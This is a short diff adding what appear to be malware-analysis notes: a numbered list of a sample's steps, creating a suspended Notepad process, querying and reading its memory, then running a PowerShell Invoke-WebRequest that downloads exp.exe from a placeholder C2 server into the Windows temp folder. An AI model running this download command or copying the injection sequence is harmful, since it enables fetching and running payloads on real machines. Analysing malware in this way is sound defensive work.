@@ -1,0 +1,6 @@
+1.Create Process "Notepadexe":
+ the process is created as an idle process and does not start until ResumeThread is called
+2.reterive information of that process such as (base address, exit code, process id) using the call NtQueryInformationProcess
+3. read the memory of that process
+4.runs powershell with the following command: Invoke-WebRequest -Uri http://somec2server/exp.exe -OutFile c:\\windows\\temp\\exp.exe 
+5.downloads the second payload which exp.exe
